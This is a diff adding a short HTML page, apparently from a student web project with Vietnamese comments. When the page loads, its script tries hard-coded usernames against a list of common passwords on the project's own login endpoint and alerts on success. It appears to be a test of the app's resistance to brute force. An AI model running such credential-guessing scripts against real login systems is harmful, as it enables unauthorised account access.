@@ -1,0 +1,72 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Brute Force Test</title>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+</head>
+<body>
+    <script>
+        async function bruteForce() {
+            const url = './ajax/dangNhap.php'; // url không thể tấn công
+            let usercorrect = '';
+            // giả sử đây sẽ là danh sách tài khoản mật khẩu thường dùng
+            const usernames = [
+                '20020001',
+                'admin1',
+                'admin2',
+                'admin3',
+                'admin4',
+                'admin5',
+                'admin6',
+                'admin7',
+            ];
+            const passwords = [
+                'password2',
+                'password3',
+                'password4',
+                'password5',
+                'password6',
+                'password7',
+                'password8',
+                'password9',
+                'password10',
+                'password11',
+                'password12',
+                'password13',
+                '12345678',
+            ];
+            for (let username of usernames) {
+                for (let password of passwords) {
+                    if (usercorrect == username) {
+                        continue;
+                    }
+                    await $.ajax({
+                        url: url,
+                        type: "post",
+                        data: {
+                        action: "dangNhap",
+                        tk: username,
+                        mk: password,
+                        },
+                        success: function (response) {
+                        data = JSON.parse(response);
+                        
+                        },
+                    });
+                    if (Array.isArray(data)) {
+                        usercorrect = username;
+                        alert(`Đăng nhập thành công tài khoản ${username} với mật khẩu: ${password}`);
+                    } else {
+                        console.log(`Đăng nhập thất bại tài khoản ${username} với mật khẩu: ${password}`);
+                    }
+                }
+            }
+        }
+
+        // Bắt đầu tấn công brute force
+        bruteForce();
+    </script>
+</body>
+</html>
